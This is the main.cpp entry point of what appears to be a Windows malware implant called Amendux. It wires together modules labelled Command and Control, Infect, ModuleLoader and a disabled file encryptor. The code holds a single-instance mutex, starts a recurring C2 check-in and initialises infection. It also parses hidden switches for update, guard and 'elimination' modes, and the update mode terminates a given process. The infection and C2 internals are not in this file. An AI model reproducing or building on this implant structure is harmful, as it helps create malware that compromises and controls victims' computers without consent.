// main.cpp : Defines the entry point for the application.

#include "stdafx.h"
#include "Log.h"
#include "Encrypt.h"
#include "Config.h"
#include "Process.h"
#include "Candcel.h"
#include "Infect.h"
#include "ModuleLoader.h"
#include "Resource.h"

#define MAX_LOADSTRING 100

// Global modules
// Amendux::Encrypt FileCrypt;                  // File encryptor module
Amendux::Candcel Commander;                     // Command and Control

// Global Variables:
HINSTANCE hInst;                                // Current instance
HANDLE hMutex;									// Instance mutx lock
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // The main window class name


// Forward declarations of functions included in this code module:
ATOM                MainRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
BOOL                CleanupInstance();
BOOL                ParseCommandLine();
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    Debug(HWND, UINT, WPARAM, LPARAM);

int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);

	// Parse commandline arguments
	if (!ParseCommandLine()) {
		return false;
	}

    // Initialize global strings
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_WIN32PROJECT1, szWindowClass, MAX_LOADSTRING);
	MainRegisterClass(hInstance);

    // Perform application initialization
    if (!InitInstance(hInstance, nCmdShow)) {
        return false;
    }

	// Initialize instance
	Amendux::Log::Init();
	Amendux::Config::Init();

	// If anything failed at this moment, disengage
	if (!Amendux::Config::Success()) {
		goto TerminateInstance;// TODO handle this via message loop
	}

	// Run core classes
	Amendux::Candcel::Init();
	Amendux::Infect::Init();
	Amendux::ModuleLoader::Init();

	// Launch the checkin process
	Amendux::Candcel::SpawnInterval(&Commander);

	// Window accelerators
	HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WIN32PROJECT1));

	// Main message loop
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

TerminateInstance:

	// Terminate modules in reverse order
	Amendux::ModuleLoader::Terminate();
	Amendux::Infect::Terminate();
	Amendux::Candcel::Terminate();
	Amendux::Config::Terminate();
	Amendux::Log::Terminate();

	// Perform application cleanup
	if (!CleanupInstance()) {
		return false;
	}

    return (int)msg.wParam;
}


//
//  FUNCTION: MainRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MainRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize         = sizeof(WNDCLASSEX);
    wcex.style          = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
	wcex.hIcon          = 0; // LoadIcon(hInstance, MAKEINTRESOURCE(IDI_WIN32PROJECT1));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_WIN32PROJECT1);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = 0; // LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}


//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // Store instance handle in our global variable
   hMutex = OpenMutex(MUTEX_ALL_ACCESS, 0, L"avcmtx");

   if (!hMutex) {
	   hMutex = CreateMutex(0, 0, L"avcmtx");
   } else {
#if DEBUG
	   MessageBox(NULL, L"Instance is already running", L"Instance", MB_OK | MB_ICONERROR);
#endif
	   return false;
   }

   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd) {
	  ReleaseMutex(hMutex);
      return false;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   // Plant the seed
   srand((unsigned int)time(NULL));

   return true;
}


//
//   FUNCTION: CleanupInstance()
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL CleanupInstance()
{
	ReleaseMutex(hMutex);

	return true;
}


//
//   FUNCTION: ParseCommandLine()
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL ParseCommandLine()
{
	LPWSTR *szArgList;
	int argCount;

	szArgList = CommandLineToArgvW(GetCommandLine(), &argCount);
	if (!szArgList || argCount < 1) {
		return false;
	}

	for (int i = 1; i < argCount; i++) {
		WCHAR *szCmd = szArgList[i];

		// Run update mode
		if ((!wcscmp(szCmd, L"/nu") || !wcscmp(szCmd, L"/NU")) && argCount > 2) {
			unsigned int pid = _wtoi(szArgList[i + 1]);
			if (pid < 1) {
				continue;
			}

			Amendux::Config::Current()->SetMode(Amendux::OperationMode::UPDATE);
			Amendux::Process::EndProcess(pid);

			while (true);
			return true;
		}

		// Spawn a guard
		if (!wcscmp(szCmd, L"/sg") || !wcscmp(szCmd, L"/SG")) {
			Amendux::Config::Current()->SetMode(Amendux::OperationMode::GUARD);
			return true;
		}

		// Run elimination mode
		if ((!wcscmp(szCmd, L"/el") || !wcscmp(szCmd, L"/EL")) && argCount > 2) {
			Amendux::Config::Current()->SetMode(Amendux::OperationMode::ELIMINATE);
			return true;
		}

	}

	LocalFree(szArgList);

	return true;
}


//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:  Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message) {
		case WM_COMMAND: {
				int wmId = LOWORD(wParam);
				// Parse the menu selections:
				switch (wmId) {
					case IDM_ABOUT:
						DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
						break;
					case IDM_ENCRYPT:
						// FileCrypt.Run();
						break;
					case IDM_DEBUG:
						DialogBox(hInst, MAKEINTRESOURCE(IDD_TEST), hWnd, Debug);
						break;
					case IDM_EXIT:
						DestroyWindow(hWnd);
						break;
					default:
						return DefWindowProc(hWnd, message, wParam, lParam);
				}
			}
			break;
		case WM_PAINT: {
				PAINTSTRUCT ps;
				HDC hdc = BeginPaint(hWnd, &ps);
				// TODO: Add any drawing code that uses hdc here...
				EndPaint(hWnd, &ps);
			}
			break;
		case WM_DESTROY:
			PostQuitMessage(0);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
    }

	return 0;
}


// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);

	switch (message) {
		case WM_INITDIALOG:
			return (INT_PTR)TRUE;

		case WM_COMMAND:
			if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) {
				EndDialog(hDlg, LOWORD(wParam));
				return (INT_PTR)TRUE;
			}
			break;
    }

	return (INT_PTR)FALSE;
}


// Message handler for about box.
INT_PTR CALLBACK Debug(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);

	switch (message) {
		case WM_INITDIALOG:
			return (INT_PTR)TRUE;

		case WM_COMMAND:
			if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) {
				EndDialog(hDlg, LOWORD(wParam));
				return (INT_PTR)TRUE;
			}
			break;
	}

	return (INT_PTR)FALSE;
}
